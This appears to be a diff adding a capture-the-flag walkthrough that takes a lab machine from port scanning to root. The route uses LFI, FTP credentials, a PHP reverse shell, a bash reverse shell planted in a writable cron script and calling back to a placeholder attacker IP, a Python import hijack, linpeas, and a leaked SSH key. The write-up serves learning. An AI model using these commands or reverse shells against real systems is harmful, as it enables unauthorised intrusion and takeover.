@@ -1,0 +1,139 @@
+Here is the complete walthrough how i became root from just an ip given:
+First of all:
+  >nmap -p- -sV -sC <IP>
+    three ports found open 
+      ssh, http, ftp
+
+I visited the website
+I checked robots.txt and flag_1.txt and another file 
+  The other file was not allowed to be opened {403}
+    which made it suspicious
+Then I used ffuf to fuzz directories
+  ffuf -w "<wordlist>" -u "http://<IP>/FUZZ" -fc 404
+    normal results
+ 
+Then I looked at the hint of flag 2 that there is LFI
+  I checked the source code of page and found that image has a parameter post
+      http://<IP>/post.php?post=striped.php 
+  I just copied the other file name from robots.txt and pasted here in post parameter and here I found there exists LFI and file had creds of ftp server
+I logged in the ftp server using creds and found flag 3 but here I noticed that files directory is writeable
+I took time and learned which shell to upload here so i uploaded a php reverse shell here as lfi will help to execute it
+I accessed the file in which shell was placed as I have setup listener using nc -lvnp <PoRT number>
+  I successfully received the connection as www-data
+I executed
+  find / -type f -name flag_* 2>/dev/null
+    and noted where the flags were placed
+
+Then I executed sudo -l
+  and found that toby user can execute ALL commands with no password 
+
+I checked hint for next flag and there was a hint of sudo -l
+I read flag 4 using sudo -u toby cat flag_4.txt
+Then I became toby using sudo -u toby bash
+There were following users
+mat
+toby
+ubuntu
+will
+
+I checked each ones group using id command
+flag5 hint included cronjobs PE vector
+I checked cronjobs using cat /etc/crontab
+
+There I found this
+  */1 * * * * mat /home/toby/jobs/cow.sh
+  cow.sh was writeable by toby
+  This script was just copying a jpg to /tmp
+
+First couldn't understand how to escalate to mat
+because I didn't remember that cow.sh is writeable
+What I did:
+  cd /tmp
+  cp /bin/bash cp
+  chmod +x cp
+but nothing happened as it was complete childishness
+Where the shell would spawn
+So I replaced the /tmp/cp contents with reverse shell of bash
+But that was also incorrect
+
+Then I learned about this and came to know that 
+  just add a reverse shell in cow.sh
+I setup a listener using nc and then added 
+  bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1
+
+I received connection as mat
+here I found file which said that u can execute a python script using sudo as will user 
+I read next flag and found that there was a scripts dir 
+  Here I had two py scripts 
+  cmd.py
+  will_script.py
+
+Upon sudo -l:
+  I can use sudo with no password for python3 and will_script.py
+
+will_script was not writeable for mat
+cmd.py was writeable
+
+will_scripts was importing a function from cmd.py
+  which had three commands 
+  1: ls
+  2: id
+  3: cat /etc/passwd
+
+I again did that what I did for cow.sh
+I copied content of bin/bash to id in /tmp dir and made it executeable
+Added /tmp to path by using this command
+  export PATH=/tmp:$PATH
+
+but all in vein
+
+But cmd.py was writeable 
+I replaced with 
+import os; os.system('/bin/bash')
+
+*Keep in mind:
+  every replacement was made using echo as nano needs a proper terminal*
+
+As I executed will_script.py using this command
+  sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
+
+I escalated to will and read flag6
+but here I couldn't find any way to become root
+
+>sudo required password
+>no suid binary found for escalation
+>ubuntu had .ssh dir but not readable
+>however kernel had some vulnerabilities for PE but I didn't go for it
+>Then I realised that running linpeas could be beneficial
+
+I setup a local python server on my machine 
+Transfered linpeas to victim and executed it
+
+No major Escalation verctor found
+But while analysing the output of Linpeas, I found this:
+[+] Interesting GROUP writable files (not in Home) (max 500)
+  Group will:
+/dev/mqueue/linpeas.txt
+/home/mat/scripts
+/home/mat/scripts/__pycache__
+  Group adm:
+/opt/backups
+/opt/backups/key.b64
+
+As will was a part of adm so there was a file /opt/backups/key.b64
+which was base64 encoded 
+ cat /opt/backups/key.b64 | base64 -d
+
+I found that it was a private ssh key
+
+I transferred the file to my machine {You can copy contents too}
+I did this:
+  ssh root@IP -i <private key>
+
+And boom root
+
+So, always analyse the whole output of linpeas as this was an information but lead to PE
+
+Thanks for reading
+
+Do share your ideas in comments
